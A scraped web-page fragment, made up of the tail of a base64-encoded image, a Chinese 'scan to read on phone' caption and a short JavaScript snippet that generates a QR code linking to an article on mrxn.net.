5BmkeoE+LTp7/2OhtdFz6N5zh8IV1T/mwccxzj0t83pE7hjWwbSKb+Cs77T83MVzznEhfSTwiNpS+rXFn5sYrLEgeLi4WbcZUPR6/NGec+tGbmxzh9R2726T7R0jHut70fb/a13ZDsi31aHP1oXkG6dtbSPPtrxJVm5Om6cHTMGaMJ0prEhTSXpzRYudk4aul41NEcRxw18xq0NnzhaSBjg9v/8ydwD+TPn/nTFb9kIJyvXlalc4nrWsboXOJgtHQeoTaM9hXcigYndaHweGscfsRZk3iFY93sRx9Mnl4b94v6x5t9fckNefY95SmIhv1pSI6dY/1iH236BDnWssfRBNOjMNyM7PW0X/qyWbuK6ZpV7oqr3rHfPpCrTdz8+gROA8mkVrhu8XH6Nw+cpOl3Svwgkgv+oE5/8PgZf0o8ITjW0DE7pvzZ2q9oXqm/6sO+n9NAUnTj95zANhD2KfHcf2WreWLoXqkJXxhuRrqmNLFZs4qjnTHama84uRVWvozeD43Fla1qXuHoPtFWr9g2kCRv/N4TuAfyved/Wv3/AAAA///gbgFnAAAABklEQVQDAJZJooO5gm+oAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 